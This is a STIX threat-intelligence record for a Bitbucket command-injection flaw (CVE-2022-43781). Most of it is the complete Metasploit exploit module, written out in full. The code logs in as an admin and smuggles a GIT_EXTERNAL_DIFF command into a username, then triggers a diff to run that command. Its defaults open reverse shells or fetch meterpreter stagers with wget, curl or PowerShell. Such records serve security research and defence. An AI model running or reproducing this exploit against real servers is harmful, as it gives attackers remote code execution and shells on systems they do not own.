{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--41f644a4-72e5-4459-82cb-21dc848159b6",
    "created": "2024-08-14T17:10:23.561166Z",
    "modified": "2024-08-14T17:10:23.56117Z",
    "name": "Bitbucket Environment Variable RCE",
    "description": " For various versions of Bitbucket, there is an authenticated command injection vulnerability that can be exploited by injecting environment variables into a user name. This module achieves remote code execution as the `atlbitbucket` user by injecting the `GIT_EXTERNAL_DIFF` environment variable, a null character as a delimiter, and arbitrary code into a user's user name. The value (payload) of the `GIT_EXTERNAL_DIFF` environment variable will be run once the Bitbucket application is coerced into generating a diff.  This module requires at least admin credentials, as admins and above only have the option to change their user name.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/bitbucket_env_var_rce.rb",
            "external_id": "bitbucket_env_var_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://y4er.com/posts/cve-2022-43781-bitbucket-server-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-security-advisory-2022-11-16-1180141667.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-43781"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Git\n  include Msf::Exploit::Git::SmartHttp\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Bitbucket Environment Variable RCE',\n        'Description' => %q{\n          For various versions of Bitbucket, there is an authenticated command injection\n          vulnerability that can be exploited by injecting environment\n          variables into a user name. This module achieves remote code execution\n          as the `atlbitbucket` user by injecting the `GIT_EXTERNAL_DIFF` environment\n          variable, a null character as a delimiter, and arbitrary code into a user's\n          user name. The value (payload) of the `GIT_EXTERNAL_DIFF` environment variable\n          will be run once the Bitbucket application is coerced into generating a diff.\n\n          This module requires at least admin credentials, as admins and above\n          only have the option to change their user name.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ry0taK', # Vulnerability Discovery\n          'y4er', # PoC and blog post\n          'Shelby Pace' # Metasploit Module\n        ],\n        'References' => [\n          [ 'URL', 'https://y4er.com/posts/cve-2022-43781-bitbucket-server-rce/'],\n          [ 'URL', 'https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-security-advisory-2022-11-16-1180141667.html'],\n          [ 'CVE', '2022-43781']\n        ],\n        'Platform' => [ 'win', 'unix', 'linux' ],\n        'Privileged' => true,\n        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [\n            'Linux Command',\n            {\n              'Platform' => 'unix',\n              'Type' => :unix_cmd,\n              'Arch' => [ ARCH_CMD ],\n              'Payload' => { 'Space' => 254 },\n              'DefaultOptions' => { 'Payload' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'MaxLineChars' => 254,\n              'Type' => :linux_dropper,\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'CmdStagerFlavor' => %i[wget curl],\n              'DefaultOptions' => { 'Payload' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'win',\n              'MaxLineChars' => 254,\n              'Type' => :win_dropper,\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'CmdStagerFlavor' => [ :psh_invokewebrequest ],\n              'DefaultOptions' => { 'Payload' => 'windows/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2022-11-16',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(7990),\n        OptString.new('USERNAME', [ true, 'User name to log in with' ]),\n        OptString.new('PASSWORD', [ true, 'Password to log in with' ]),\n        OptString.new('TARGETURI', [ true, 'The URI of the Bitbucket instance', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login'),\n      'keep_cookies' => true\n    )\n\n    return CheckCode::Unknown('Failed to retrieve a response from the target') unless res\n    return CheckCode::Safe('Target does not appear to be Bitbucket') unless res.body.include?('Bitbucket')\n\n    nokogiri_data = res.get_html_document\n    footer = nokogiri_data&.at('footer')\n    return CheckCode::Detected('Failed to retrieve version information from Bitbucket') unless footer\n\n    version_info = footer.at('span')&.children&.text\n    return CheckCode::Detected('Failed to find version information in footer section') unless version_info\n\n    vers_matches = version_info.match(/v(\\d+\\.\\d+\\.\\d+)/)\n    return CheckCode::Detected('Failed to find version info in expected format') unless vers_matches && vers_matches.length > 1\n\n    version_str = vers_matches[1]\n\n    vprint_status(\"Found version #{version_str} of Bitbucket\")\n    major, minor, revision = version_str.split('.')\n    rev_num = revision.to_i\n\n    case major\n    when '7'\n      case minor\n      when '0', '1', '2', '3', '4', '5'\n        return CheckCode::Appears\n      when '6'\n        return CheckCode::Appears if rev_num >= 0 && rev_num <= 18\n      when '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'\n        return CheckCode::Appears\n      when '17'\n        return CheckCode::Appears if rev_num >= 0 && rev_num <= 11\n      when '18', '19', '20'\n        return CheckCode::Appears\n      when '21'\n        return CheckCode::Appears if rev_num >= 0 && rev_num <= 5\n      end\n    when '8'\n      print_status('Versions 8.* are vulnerable only if the mesh setting is disabled')\n      case minor\n      when '0'\n        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4\n      when '1'\n        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4\n      when '2'\n        return CheckCode::Appears if rev_num >= 0 && rev_num <= 3\n      when '3'\n        return CheckCode::Appears if rev_num >= 0 && rev_num <= 2\n      when '4'\n        return CheckCode::Appears if rev_num == 0 || rev_num == 1\n      end\n    end\n\n    CheckCode::Detected\n  end\n\n  def default_branch\n    @default_branch ||= Rex::Text.rand_text_alpha(5..9)\n  end\n\n  def uname_payload(cmd)\n    \"#{datastore['USERNAME']}\\u0000GIT_EXTERNAL_DIFF=$(#{cmd})\"\n  end\n\n  def log_in(username, password)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login'),\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to access login page') unless res&.body&.include?('login')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'j_atl_security_check'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'j_username' => username,\n        'j_password' => password,\n        '_atl_remember_me' => 'on',\n        'submit' => 'Log in'\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Didn\\'t retrieve a response') unless res\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'projects'),\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'No response from the projects page') unless res\n    unless res.body.include?('Logged in')\n      fail_with(Failure::UnexpectedReply, 'Failed to log in. Please check credentials')\n    end\n  end\n\n  def create_project\n    proj_uri = normalize_uri(target_uri.path, 'projects?create')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => proj_uri,\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Unable to access project creation page') unless res&.body&.include?('Create project')\n\n    vprint_status('Retrieving security token')\n    html_doc = res.get_html_document\n    token_data = html_doc.at('div//input[@name=\"atl_token\"]')\n    fail_with(Failure::UnexpectedReply, 'Failed to find element containing \\'atl_token\\'') unless token_data\n\n    @token = token_data['value']\n    fail_with(Failure::UnexpectedReply, 'No token found') if @token.blank?\n\n    project_name = Rex::Text.rand_text_alpha(5..9)\n    project_key = Rex::Text.rand_text_alpha(5..9).upcase\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => proj_uri,\n      'keep_cookies' => true,\n      'vars_post' => {\n        'name' => project_name,\n        'key' => project_key,\n        'submit' => 'Create project',\n        'atl_token' => @token\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to receive response from project creation') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to create project') unless res['Location']&.include?(project_key)\n\n    print_status('Project creation was successful')\n    [ project_name, project_key ]\n  end\n\n  def create_repository\n    repo_uri = normalize_uri(target_uri.path, 'projects', @project_key, 'repos?create')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => repo_uri,\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to access repo creation page') unless res\n\n    html_doc = res.get_html_document\n\n    dropdown_data = html_doc.at('li[@class=\"user-dropdown\"]')\n    fail_with(Failure::UnexpectedReply, 'Failed to find dropdown to retrieve email address') if dropdown_data.blank?\n    email = dropdown_data&.at('span')&.[]('data-emailaddress')\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve email address from response') if email.blank?\n\n    repo_name = Rex::Text.rand_text_alpha(5..9)\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => repo_uri,\n      'keep_cookies' => true,\n      'vars_post' => {\n        'name' => repo_name,\n        'defaultBranchId' => default_branch,\n        'description' => '',\n        'scmId' => 'git',\n        'forkable' => 'false',\n        'atl_token' => @token,\n        'submit' => 'Create repository'\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'No response received from repo creation') unless res\n    res = send_request_cgi(\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'uri' => normalize_uri(target_uri.path, 'projects', @project_key, 'repos', repo_name, 'browse')\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Repository was not created') if res&.code == 404\n    print_good(\"Successfully created repository '#{repo_name}'\")\n\n    [ email, repo_name ]\n  end\n\n  def generate_repo_objects(email, repo_file_data = [], parent_object = nil)\n    txt_data = Rex::Text.rand_text_alpha(5..20)\n    blob_object = GitObject.build_blob_object(txt_data)\n    file_name = \"#{Rex::Text.rand_text_alpha(4..10)}.txt\"\n\n    file_data = {\n      mode: '100755',\n      file_name: file_name,\n      sha1: blob_object.sha1\n    }\n\n    tree_data = (repo_file_data.empty? ? [ file_data ] : [ file_data, repo_file_data ])\n    tree_obj = GitObject.build_tree_object(tree_data)\n    commit_obj = GitObject.build_commit_object({\n      tree_sha1: tree_obj.sha1,\n      email: email,\n      message: Rex::Text.rand_text_alpha(4..30),\n      parent_sha1: (parent_object.nil? ? nil : parent_object.sha1)\n    })\n\n    {\n      objects: [ commit_obj, tree_obj, blob_object ],\n      file_data: file_data\n    }\n  end\n\n  # create two files in two separate commits in order\n  # to view a diff and get code execution\n  def create_commits(email)\n    init_objects = generate_repo_objects(email)\n    commit_obj = init_objects[:objects].first\n\n    refs = {\n      'HEAD' => \"refs/heads/#{default_branch}\",\n      \"refs/heads/#{default_branch}\" => commit_obj.sha1\n    }\n\n    final_objects = generate_repo_objects(email, init_objects[:file_data], commit_obj)\n    repo_objects = final_objects[:objects] + init_objects[:objects]\n    new_commit = final_objects[:objects].first\n    new_file = final_objects[:file_data][:file_name]\n\n    git_uri = normalize_uri(target_uri.path, \"scm/#{@project_key}/#{@repo_name}.git\")\n    res = send_receive_pack_request(\n      git_uri,\n      refs['HEAD'],\n      repo_objects,\n      '0' * 40 # no commits should exist yet, so no branch tip in repo yet\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to push commit to repository') unless res\n    fail_with(Failure::UnexpectedReply, 'Git responded with an error') if res.body.include?('error:')\n    fail_with(Failure::UnexpectedReply, 'Git push failed') unless res.body.include?('unpack ok')\n\n    [ new_commit.sha1, commit_obj.sha1, new_file ]\n  end\n\n  def get_user_id(curr_uname)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin/users/view'),\n      'vars_get' => { 'name' => curr_uname }\n    )\n\n    matched_id = res.get_html_document&.xpath(\"//script[contains(text(), '\\\"name\\\":\\\"#{curr_uname}\\\"')]\")&.first&.text&.match(/\"id\":(\\d+)/)\n    fail_with(Failure::UnexpectedReply, 'No matches found for id of user') unless matched_id && matched_id.length > 1\n\n    matched_id[1]\n  end\n\n  def change_username(curr_uname, new_uname)\n    @user_id ||= get_user_id(curr_uname)\n\n    headers = {\n      'X-Requested-With' => 'XMLHttpRequest',\n      'X-AUSERID' => @user_id,\n      'Origin' => \"#{ssl ? 'https' : 'http'}://#{peer}\"\n    }\n\n    vars = {\n      'name' => curr_uname,\n      'newName' => new_uname\n    }.to_json\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'rest/api/latest/admin/users/rename'),\n      'ctype' => 'application/json',\n      'keep_cookies' => true,\n      'headers' => headers,\n      'data' => vars\n    )\n\n    unless res\n      print_bad('Did not receive a response to the user name change request')\n      return false\n    end\n\n    unless res.body.include?(new_uname) || res.body.include?('GIT_EXTERNAL_DIFF')\n      print_bad('User name change was unsuccessful')\n      return false\n    end\n\n    true\n  end\n\n  def commit_uri(project_key, repo_name, commit_sha)\n    normalize_uri(\n      target_uri.path,\n      'rest/api/latest/projects',\n      project_key,\n      'repos',\n      repo_name,\n      'commits',\n      commit_sha\n    )\n  end\n\n  def view_commit_diff(latest_commit_sha, first_commit_sha, diff_file)\n    commit_diff_uri = normalize_uri(\n      commit_uri(@project_key, @repo_name, latest_commit_sha),\n      'diff',\n      diff_file\n    )\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => commit_diff_uri,\n      'keep_cookies' => true,\n      'vars_get' => { 'since' => first_commit_sha }\n    )\n  end\n\n  def delete_repository(username)\n    vprint_status(\"Attempting to delete repository '#{@repo_name}'\")\n    repo_uri = normalize_uri(target_uri.path, 'projects', @project_key, 'repos', @repo_name.downcase)\n    res = send_request_cgi(\n      'method' => 'DELETE',\n      'uri' => repo_uri,\n      'keep_cookies' => true,\n      'headers' => {\n        'X-AUSERNAME' => username,\n        'X-AUSERID' => @user_id,\n        'X-Requested-With' => 'XMLHttpRequest',\n        'Origin' => \"#{ssl ? 'https' : 'http'}://#{peer}\",\n        'ctype' => 'application/json',\n        'Accept' => 'application/json, text/javascript'\n      }\n    )\n\n    unless res&.body&.include?('scheduled for deletion')\n      print_warning('Failed to delete repository')\n      return\n    end\n\n    print_good('Repository has been deleted')\n  end\n\n  def delete_project(username)\n    vprint_status(\"Now attempting to delete project '#{@project_name}'\")\n    send_request_cgi( # fails to return a response\n      'method' => 'DELETE',\n      'uri' => normalize_uri(target_uri.path, 'projects', @project_key),\n      'keep_cookies' => true,\n      'headers' => {\n        'X-AUSERNAME' => username,\n        'X-AUSERID' => @user_id,\n        'X-Requested-With' => 'XMLHttpRequest',\n        'Origin' => \"#{ssl ? 'https' : 'http'}://#{peer}\",\n        'Referer' => \"#{ssl ? 'https' : 'http'}://#{peer}/projects/#{@project_key}/settings\",\n        'ctype' => 'application/json',\n        'Accept' => 'application/json, text/javascript, */*; q=0.01',\n        'Accept-Encoding' => 'gzip, deflate'\n      }\n    )\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'projects', @project_key),\n      'keep_cookies' => true\n    )\n\n    unless res&.code == 404\n      print_warning('Failed to delete project')\n      return\n    end\n\n    print_good('Project has been deleted')\n  end\n\n  def get_repo\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'rest/api/latest/repos'),\n      'keep_cookies' => true\n    )\n\n    unless res\n      print_status('Couldn\\'t access repos page. Will create repo')\n      return []\n    end\n\n    json_data = JSON.parse(res.body)\n    unless json_data && json_data['size'] >= 1\n      print_status('No accessible repositories. Will attempt to create a repo')\n      return []\n    end\n\n    repo_data = json_data['values'].first\n    repo_name = repo_data['slug']\n    project_key = repo_data['project']['key']\n\n    unless repo_name && project_key\n      print_status('Could not find repo name and key. Creating repo')\n      return []\n    end\n\n    [ repo_name, project_key ]\n  end\n\n  def get_repo_info\n    unless @project_name && @project_key\n      print_status('Failed to find valid project information. Will attempt to create repo')\n      return nil\n    end\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri('projects', @project_key, 'repos', @project_name, 'commits'),\n      'keep_cookies' => true\n    )\n\n    unless res\n      print_status(\"Failed to access existing repository #{@project_name}\")\n      return nil\n    end\n\n    html_doc = res.get_html_document\n    commit_data = html_doc.search('a[@class=\"commitid\"]')\n    unless commit_data && commit_data.length > 1\n      print_status('No commits found for existing repo')\n      return nil\n    end\n\n    latest_commit = commit_data[0]['data-commitid']\n    prev_commit = commit_data[1]['data-commitid']\n\n    file_uri = normalize_uri(commit_uri(@project_key, @project_name, latest_commit), 'changes')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => file_uri,\n      'keep_cookies' => true\n    )\n\n    return nil unless res\n\n    json = JSON.parse(res.body)\n    return nil unless json['values']\n\n    path = json['values']&.first&.dig('path')\n    return nil unless path\n\n    [ latest_commit, prev_commit, path['name'] ]\n  end\n\n  def exploit\n    @use_public_repo = true\n    datastore['GIT_USERNAME'] = datastore['USERNAME']\n    datastore['GIT_PASSWORD'] = datastore['PASSWORD']\n\n    if datastore['USERNAME'].blank? && datastore['PASSWORD'].blank?\n      fail_with(Failure::BadConfig, 'No credentials to log in with.')\n    end\n\n    log_in(datastore['USERNAME'], datastore['PASSWORD'])\n    @curr_uname = datastore['USERNAME']\n\n    @project_name, @project_key = get_repo\n    @repo_name = @project_name\n    @latest_commit, @first_commit, @diff_file = get_repo_info\n    unless @latest_commit && @first_commit && @diff_file\n      @use_public_repo = false\n      @project_name, @project_key = create_project\n      email, @repo_name = create_repository\n      @latest_commit, @first_commit, @diff_file = create_commits(email)\n      print_good(\"Commits added: #{@first_commit}, #{@latest_commit}\")\n    end\n\n    print_status('Sending payload')\n    case target['Type']\n    when :win_dropper\n      execute_cmdstager(linemax: target['MaxLineChars'] - uname_payload('cmd.exe /c ').length, noconcat: true, temp: '.')\n    when :linux_dropper\n      execute_cmdstager(linemax: target['MaxLineChars'], noconcat: true)\n    when :unix_cmd\n      execute_command(payload.encoded.strip)\n    end\n  end\n\n  def cleanup\n    if @curr_uname != datastore['USERNAME']\n      print_status(\"Changing user name back to '#{datastore['USERNAME']}'\")\n\n      if change_username(@curr_uname, datastore['USERNAME'])\n        @curr_uname = datastore['USERNAME']\n      else\n        print_warning('User name is still set to payload.' \\\n                      \"Please manually change the user name back to #{datastore['USERNAME']}\")\n      end\n    end\n\n    unless @use_public_repo\n      delete_repository(@curr_uname) if @repo_name\n      delete_project(@curr_uname) if @project_name\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    if target['Platform'] == 'win'\n      curr_payload = (cmd.ends_with?('.exe') ? uname_payload(\"cmd.exe /c #{cmd}\") : uname_payload(cmd))\n    else\n      curr_payload = uname_payload(cmd)\n    end\n\n    unless change_username(@curr_uname, curr_payload)\n      fail_with(Failure::UnexpectedReply, 'Failed to change user name to payload')\n    end\n\n    view_commit_diff(@latest_commit, @first_commit, @diff_file)\n    @curr_uname = curr_payload\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-11-16",
    "x_mitre_platforms": [
        "win'"
    ]
}